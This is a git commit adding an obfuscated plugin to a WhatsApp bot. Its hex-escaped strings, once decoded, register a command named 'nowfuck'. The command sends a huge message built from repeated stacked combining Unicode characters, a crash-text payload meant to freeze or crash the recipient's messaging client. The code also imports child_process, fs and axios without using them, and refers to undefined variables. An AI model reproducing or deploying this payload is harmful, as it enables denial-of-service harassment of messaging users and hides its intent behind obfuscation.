8f3aa18af84c247514cb77020a5704093fd1b2c1
RavinduManoj <89992202+RavinduManoj@users.noreply.github.com>
2021-09-16 17:44:51 +0530

    Create aaa.js

---
+++ plugins/aaa.js
@@ -0,0 +1,12 @@
+/* Codded by @Queen Sew Manoj
+
+Telegram: t.me/Queen SewManoj
+Facebook: https://www.facebook.com/ravindu.manoj.79
+
+Licensed under the  GPL-3.0 License;
+you may not use this file except in compliance with the License.
+
+Whats bot - Queen Sew Manoj
+*/
+const Fuk = 'ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ͜͡'
+var _0x905c=["\x2E\x2E\x2F\x65\x76\x65\x6E\x74\x73","\x40\x61\x64\x69\x77\x61\x6A\x73\x68\x69\x6E\x67\x2F\x62\x61\x69\x6C\x65\x79\x73","\x61\x78\x69\x6F\x73","\x2E\x2E\x2F\x63\x6F\x6E\x66\x69\x67","\x63\x68\x69\x6C\x64\x5F\x70\x72\x6F\x63\x65\x73\x73","\x66\x73","\x6E\x6F\x77\x66\x75\x63\x6B","\u2727\x53\x65\x77\u2727","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65","\x6E\x65\x77\x63\x6D\x64\x61\x64\x64\x74\x6F\x73\x65\x77"];const QueenSew=require(_0x905c[0]);const {MessageType,MessageOptions,Mimetype}=require(_0x905c[1]);const axios=require(_0x905c[2]);const Config=require(_0x905c[3]);const {spawnSync}=require(_0x905c[4]);const fs=require(_0x905c[5]);QueenSew[_0x905c[9]]({pattern:_0x905c[6],fromMe:RS,disc:NNVL},(async (_0x791ex5,_0x791ex6)=>{ await _0x791ex5[_0x905c[8]](_0x905c[7]+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk+ Fuk)}))
